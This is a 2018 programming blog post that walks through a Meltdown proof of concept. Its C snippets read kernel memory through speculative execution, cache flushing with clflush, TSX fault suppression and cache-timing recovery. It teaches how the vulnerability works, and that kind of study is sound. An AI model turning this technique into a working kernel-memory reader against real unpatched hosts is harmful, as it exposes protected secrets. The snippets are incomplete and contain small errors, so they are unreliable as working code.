---
layout: post
title: "Programmer's guide to meltdown"
date: 2018-01-09 23:57:48 -0200
comments: true
categories: [security, hardware, programming]
keywords: meltdown, exploit, proof-of-concept, poc, kpti, kaiser, security
description: programmer's guide to meltdown exploit poc
---

Ok, what I want here is to guide you through a Meltdown proof-of-concept that
peeks into kernel data that cpu is supposed to protect. Unfortunately, that
promise was broken and virtually all intel x86 cpu hosts are vulnerable until
patched (Linux patchset is available and named [kpti (kernel page table isolation)](https://lkml.org/lkml/2017/10/31/884)).

So far, we thought we were protected by cpu mechanisms because when you try
to load kernel (sensitive) data, cpu triggers an exception which in turn is
propagated by kernel to application as SIGSEGV, leading to application
termination, look at this example:
```bash
$ cat /proc/kallsyms | grep banner
ffffffff81a00060 R linux_proc_banner
$ cat kernel_address_read.cc 
main() {
  	char *p = (char*)0xffffffff81a00060; // use address of a kernel symbol containing banner
	*p = 0;
}
$ ./kernel_address_read
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

So time went by, and we all thought we were safe. Recently it was figured out
that speculative execution could be exploited to break that promise.
It basically consists of making the cpu use the value stored in a kernel
address before the cpu detects the access to kernel data is an invalid
instruction, but it's not that simple... look at this example:

```c
char *kernel_address = (char*)0xffffffff81a00060;
char kernel_data = *kernel_address;
int number = 10;
char byte = kernel_data + number;
```

It turns out that cpu may actually perform the addition of value found in kernel
address and 10, but the result is definitely not returned to the program which
again terminates with a SIGSEGV.

Now comes the BINGO, EUREKA! moment: A researcher figured out that whichever
data (in example above kernel_data and byte) used in the instruction
that procedes the invalid one (*kernel_address) will remain cached in the
cpu data cache. Yes! CPU doesn't invalidate data cached from an instruction
which used the result (kernel data) of an invalid one (access to kernel data).

Well, data cache cannot directly be read. But we know that access to data
cached is much faster than to uncached ones, so what we can do is to use the
byte read from kernel as an index for an array of size 256 elements, each index
representing a possible representation of a byte (0..255). For example:

```c
char *kernel_address = (char*)0xffffffff81a00060;
char array[256];

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index];
```

That would only work if cache line size is 1, but it's usually 64 for level 1,
so we need to multiply array size and index by 64.

```c
const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index * cache_line_size];
```

So if it happens that the instruction that accesses array using byte read from
kernel is executed before cpu triggers exception for invalid access to kernel,
it means cpu will bring array[kernel_data_as_index * cache_line_size] to cache.

Now we know that we can iterate through the 256 "cache lines" in array, and
we'll know that the one with the fastest access time is the one cached by cpu,
and the "cache line" index is actually the byte read from kernel.

For example:

```c
const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index * cache_line_size];

// Please consider for now that signal handler for sigsegv was set up,
// and we continue executing from here after invalid access

int fastest_i_time = MAX_INTEGER_VALUE;
int fastest_i = 0;

for (int i = 0; i < 256; i++) {
    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
    int time = access_time_to(array[i * cache_line_size]);
    if (time < fastest_i_time) {
        fastest_i_time = time;
        fastest_i = i;
    }
}

printf("byte read from kernel is: %d\n", fastest_i);
```

It's not hard to understand it. If you think of it, fastest_i is equal to the
byte stored in kernel_address because program determined array[fastest_i *
cache_line_size] is cached by cpu and only one place in array was cached
previously by the instructions that accessed kernel and used its value to
retrieve a byte from array.

In real life, it's not that simple to implement because you need to clear data
cache (clflush instruction can be used) before performing the test because you
want to read more bytes and the data cache shouldn't be polluted for array or
wrong result is returned.

This is my assembly inline to clear cache line for a specific address:
```c
__attribute__((always_inline))
inline void __clflush(const char *address)
{
    asm __volatile__ (
        "mfence         \n"
        "clflush 0(%0)  \n"
        :
        : "r" (address)
        :            );
}
```

So you'll need to do that for each "cache line" in the array, the code now
becomes this:

```c
const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

for (int i = 0; i < 256; i++) {
    __clflush(array[i * cache_line_size]);
}

char kernel_data_as_index = *kernel_address;
char byte = array[kernel_data_as_index * cache_line_size];

int fastest_i_time = MAX_INTEGER_VALUE;
int fastest_i = 0;

for (int i = 0; i < 256; i++) {
    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
    int time = access_time_to(array[i * cache_line_size]);
    if (time < fastest_i_time) {
        fastest_i_time = time;
        fastest_i = i;
    }
}

printf("byte read from kernel is: %d\n", fastest_i);
```

That's not complete code because you'll have to set up signal handler or use
TSX (Transactional Synchronization Extensions) to mitigate SIGSEGV that occurs
after the instruction to load kernel address retires (is fully executed).
Follow example using TSX:
```c
const int cache_line_size = 64;
char *kernel_address = (char*)0xffffffff81a00060;
char array[256 * cache_line_size];

for (int i = 0; i < 256; i++) {
    __clflush(array[i * cache_line_size]);
}

if (_xbegin() == _XBEGIN_STARTED) {
    char kernel_data_as_index = *kernel_address;
    char byte = array[kernel_data_as_index * cache_line_size];
    _xend();
} else {
    // do nothing
}

int fastest_i_time = MAX_INTEGER_VALUE;
int fastest_i = 0;

for (int i = 0; i < 256; i++) {
    // access_time_to() calculates the time to load array[i * cache_line_size] using rdtsc or rdtscp.
    int time = access_time_to(array[i * cache_line_size]);
    if (time < fastest_i_time) {
        fastest_i_time = time;
        fastest_i = i;
    }
}

printf("byte read from kernel is: %d\n", fastest_i);
```

There's nothing much you can do with this code that only reads 1 byte from
kernel space, so I'd suggest you to take a look at the code of my own project
that exploits meltdown to check whether or not system is affected, follow link:
https://github.com/raphaelsc/Am-I-affected-by-Meltdown
I'd also recommend you to take a look at proof-of-concept of the researchers
involved: https://github.com/IAIK/meltdown/

Cheers!
